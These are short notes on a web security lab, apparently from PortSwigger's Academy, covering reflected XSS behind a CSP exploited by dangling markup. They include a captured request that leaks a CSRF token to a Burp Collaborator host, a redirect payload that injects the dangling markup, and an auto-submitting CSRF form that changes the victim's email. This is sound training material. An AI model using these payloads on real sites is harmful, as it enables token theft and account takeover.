Reflected XSS protected by CSP, with dangling markup attack

This is a biggie, but the solution provided in the lab is very good. 

If you can't find the CSRF token in Burp Collaborator, look more closely in the request:

GET /?%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type=%22hidden%22%20name=%22csrf%22%20value=%22xhIb9ZfyX5v83UrRvBWud7OuMyFZYysb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class= HTTP/1.1
Host: 9eojjhpnsvu2v70h8po0yyyvhmncb1.burpcollaborator.net
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://ac341fbc1faa41ec80c335b30007006d.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//9eojjhpnsvu2v70h8po0yyyvhmncb1.burpcollaborator.net?
Accept-Encoding: gzip, deflate, br

Payload code to get the token:
<script>
location='https://ac341fbc1faa41ec80c335b30007006d.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//9eojjhpnsvu2v70h8po0yyyvhmncb1.burpcollaborator.net?';
</script> 

Payload to trigger the email change:
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac341fbc1faa41ec80c335b30007006d.web-security-academy.net/email/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="xhIb9ZfyX5v83UrRvBWud7OuMyFZYysb" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
